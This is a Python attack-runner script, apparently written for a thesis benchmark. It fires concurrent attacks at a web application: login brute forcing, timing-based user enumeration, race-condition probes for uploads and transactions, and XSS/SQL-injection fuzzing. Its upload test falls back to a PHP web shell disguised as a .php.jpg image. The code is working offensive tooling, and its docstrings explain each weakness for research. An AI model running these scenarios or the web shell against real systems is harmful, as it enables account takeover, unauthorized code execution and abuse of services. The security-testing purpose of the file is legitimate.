#!/usr/bin/env python3
"""
attacks/run_mcp_scenario.py
Concurrent attack runner for thesis benchmark.

Five scenarios:
  auth_storm        - Brute-force / credential stuffing the login endpoint
  file_upload_race  - Concurrent malicious file uploads (TOCTOU probe)
  double_spend_race - Simultaneous transaction submissions
  fuzz_inputs       - Rotate XSS + SQLi payloads across input endpoints
  timing_probe      - Measure response time delta for user enumeration
"""

import argparse, asyncio, json, os, sys, time
from datetime import datetime, timezone
from pathlib import Path

try:
    import aiohttp
except ImportError:
    print("Run: pip install aiohttp --break-system-packages", file=sys.stderr)
    sys.exit(1)

PAYLOAD_DIR = Path(__file__).resolve().parent / "payloads"

def load_lines(filename):
    p = PAYLOAD_DIR / filename
    if p.exists():
        return [l.strip() for l in p.read_text().splitlines()
                if l.strip() and not l.startswith("#")]
    return ["test"]

def load_upload_payloads():
    d = PAYLOAD_DIR / "upload_payloads"
    results = []
    if d.exists():
        for f in sorted(d.iterdir()):
            if f.is_file():
                results.append((f.name, f.read_bytes()))
    return results or [("test.php.jpg", b"<?php system($_GET['cmd']); ?>")]


async def do_request(session, method, url, **kwargs):
    t0 = time.monotonic()
    try:
        async with session.request(method, url, allow_redirects=True, **kwargs) as resp:
            body = await resp.text(errors="replace")
            return {
                "status": resp.status,
                "elapsed_ms": round((time.monotonic()-t0)*1000, 2),
                "snippet": body[:200],
                "ok": 200 <= resp.status < 400,
            }
    except Exception as e:
        return {"status": 0, "elapsed_ms": round((time.monotonic()-t0)*1000,2),
                "snippet": str(e)[:150], "ok": False}


async def auth_storm(session, base_url, idx):
    """
    WHAT IT TESTS: Rate limiting and account lockout on the login endpoint.
    
    HOW IT WORKS: Sends many login attempts with wrong passwords simultaneously.
    A secure app should block or slow down after N failures. A vulnerable app
    lets all requests through — meaning an attacker can try thousands of
    passwords per second (brute force / credential stuffing).
    
    WHAT A HIGH CAF MEANS: Concurrency bypasses the rate limiter. At c=1 the
    app might block after 5 tries. At c=50 all 50 hit before the block triggers.
    """
    url = f"{base_url}/login"
    data = {"email": f"user{idx % 20}@test.com", "password": f"wrongpass{idx}"}
    return await do_request(session, "POST", url, data=data)


async def file_upload_race(session, base_url, idx):
    """
    WHAT IT TESTS: TOCTOU (Time Of Check To Use) race condition in file upload.
    
    HOW IT WORKS: Uploads malicious files simultaneously. A vulnerable app
    checks the file type, then moves it — but between check and move, another
    thread can slip a bad file through. Also tests whether the server rejects
    .php.jpg polyglot files (looks like image, executes as PHP).
    
    WHAT A HIGH CAF MEANS: The race window is large enough that concurrent
    uploads reliably land malicious files on the server.
    """
    url = f"{base_url}/dashboard"
    payloads = load_upload_payloads()
    name, content = payloads[idx % len(payloads)]
    form = aiohttp.FormData()
    form.add_field("file", content, filename=name, content_type="image/jpeg")
    form.add_field("submit", "Upload")
    return await do_request(session, "POST", url, data=form)


async def double_spend_race(session, base_url, idx):
    """
    WHAT IT TESTS: Race condition in transaction / state-changing operations.
    
    HOW IT WORKS: Submits the same operation (e.g. a purchase or transfer)
    multiple times simultaneously. A vulnerable app processes all of them before
    any one completes — the database check-then-write is not atomic.
    
    WHAT A HIGH CAF MEANS: Multiple concurrent identical requests all succeed,
    meaning an attacker gets the action performed multiple times for the price
    of one (double spend, duplicate item creation, etc).
    """
    url = f"{base_url}/items/new"
    data = {"name": f"item_{idx}", "description": "race_test", "submit": "Submit"}
    return await do_request(session, "POST", url, data=data)


async def fuzz_inputs(session, base_url, idx):
    """
    WHAT IT TESTS: XSS (Cross-Site Scripting) and SQL Injection in input fields.
    
    HOW IT WORKS: Rotates through known attack payloads (script tags, SQL
    operators) and submits them to every input endpoint. A vulnerable app
    reflects the payload back in the HTML (XSS) or errors on SQL syntax
    (SQLi indicator). Running concurrently means all endpoints are hit
    simultaneously rather than one at a time.
    
    WHAT A HIGH CAF MEANS: Concurrent fuzzing finds more endpoints because
    the app can't handle simultaneous malformed input and leaks errors.
    """
    xss  = load_lines("xss_payloads.txt")
    sqli = load_lines("sqli_payloads.txt")
    all_payloads = xss + sqli
    payload = all_payloads[idx % len(all_payloads)]
    endpoints = ["/register", "/login", "/dashboard"]
    url = base_url + endpoints[idx % len(endpoints)]
    params = {"q": payload, "search": payload}
    data   = {"username": payload, "email": f"test{idx}@x.com",
              "password": "testpass123", "confirm_password": "testpass123"}
    if idx % 2 == 0:
        return await do_request(session, "GET", url, params=params)
    else:
        return await do_request(session, "POST", url, data=data)


async def timing_probe(session, base_url, idx):
    """
    WHAT IT TESTS: User enumeration via timing side-channel.
    
    HOW IT WORKS: Alternates between real-looking usernames (admin, common
    names) and random strings. Measures response time for each. A vulnerable
    app takes longer to respond for valid usernames (because it runs bcrypt
    on a found user, but returns instantly for not-found users) — leaking
    which usernames exist.
    
    WHAT A HIGH CAF MEANS: Concurrent probes amplify the timing signal —
    you get more samples faster, making statistical analysis of timing
    differences more reliable for the attacker.
    """
    url = f"{base_url}/login"
    real_users    = ["admin@admin.com", "admin@test.com", "user@test.com",
                     "test@test.com",   "root@root.com"]
    random_users  = [f"zzznotreal{i}@fake.com" for i in range(10)]
    all_users = real_users + random_users
    email = all_users[idx % len(all_users)]
    data  = {"email": email, "password": "timing_probe_wrong_x9z"}
    result = await do_request(session, "POST", url, data=data)
    result["probed_email"] = email
    result["is_real_attempt"] = email in real_users
    return result

SCENARIOS = {
    "auth_storm":       auth_storm,
    "file_upload_race": file_upload_race,
    "double_spend_race":double_spend_race,
    "fuzz_inputs":      fuzz_inputs,
    "timing_probe":     timing_probe,
}


async def run_scenario(app_id, scenario, concurrency, duration, base_url):
    fn        = SCENARIOS[scenario]
    results   = []
    errors    = []
    semaphore = asyncio.Semaphore(concurrency)
    counter   = {"idx": 0}
    stop      = asyncio.Event()
    ts_start  = datetime.now(timezone.utc).isoformat()

    connector = aiohttp.TCPConnector(limit=concurrency+10, ssl=False)
    timeout   = aiohttp.ClientTimeout(total=15)

    async def worker():
        async with semaphore:
            if stop.is_set(): return
            idx = counter["idx"]; counter["idx"] += 1
            r   = await fn(session, base_url, idx)
            r["req_idx"] = idx
            results.append(r)
            if not r["ok"]:
                errors.append({"req_idx":idx,"status":r["status"],"snippet":r["snippet"]})

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        deadline = time.monotonic() + duration
        tasks    = set()
        while time.monotonic() < deadline:
            if len(tasks) < concurrency * 2:
                t = asyncio.create_task(worker())
                tasks.add(t); t.add_done_callback(tasks.discard)
            else:
                await asyncio.sleep(0.005)
        stop.set()
        if tasks: await asyncio.gather(*tasks, return_exceptions=True)

    ts_end = datetime.now(timezone.utc).isoformat()
    total  = len(results)
    ok     = sum(1 for r in results if r["ok"])

    # Timing stats
    times = sorted(r["elapsed_ms"] for r in results)
    n     = len(times)
    timing = {}
    if n:
        timing = {
            "min_ms":  times[0],
            "max_ms":  times[-1],
            "mean_ms": round(sum(times)/n, 2),
            "p50_ms":  times[n//2],
            "p95_ms":  times[int(n*0.95)],
            "p99_ms":  times[int(n*0.99)],
        }

    extra = {}
    if scenario == "timing_probe" and results:
        real_times   = [r["elapsed_ms"] for r in results if r.get("is_real_attempt")]
        random_times = [r["elapsed_ms"] for r in results if not r.get("is_real_attempt") and "is_real_attempt" in r]
        if real_times and random_times:
            delta = round(sum(real_times)/len(real_times) - sum(random_times)/len(random_times), 2)
            extra["timing_delta_ms"]   = delta
            extra["enumeration_signal"] = "YES" if abs(delta) > 10 else "NO"

    return {
        "app_id":             app_id,
        "attack":             scenario,
        "concurrency":        concurrency,
        "duration_s":         duration,
        "requests_total":     total,
        "successful_requests":ok,
        "failed_requests":    total - ok,
        "success_rate":       round(ok/total, 4) if total else 0,
        "errors":             errors[:30],
        "timing_stats":       timing,
        "extra":              extra,
        "timestamp_start":    ts_start,
        "timestamp_end":      ts_end,
    }


def main():
    parser = argparse.ArgumentParser(description="Concurrent attack runner")
    parser.add_argument("--app-id",      required=True)
    parser.add_argument("--scenario",    required=True, choices=list(SCENARIOS.keys()))
    parser.add_argument("--concurrency", type=int, default=50)
    parser.add_argument("--duration",    type=int, default=30)
    parser.add_argument("--out",         required=True)
    parser.add_argument("--base-url",    default=os.getenv("TARGET_BASE_URL","http://localhost:8080"))
    args = parser.parse_args()

    Path(args.out).parent.mkdir(parents=True, exist_ok=True)

    print(f"[*] {args.app_id} | {args.scenario} | c={args.concurrency} | t={args.duration}s | {args.base_url}")
    result = asyncio.run(run_scenario(
        args.app_id, args.scenario, args.concurrency, args.duration, args.base_url))

    Path(args.out).write_text(json.dumps(result, indent=2))
    sr = result['success_rate']
    print(f"[+] {result['requests_total']} requests | "
          f"{result['successful_requests']} ok ({sr:.0%}) | "
          f"p50={result['timing_stats'].get('p50_ms','?')}ms")
    if result["extra"]:
        for k,v in result["extra"].items():
            print(f"    {k}: {v}")

if __name__ == "__main__":
    main()
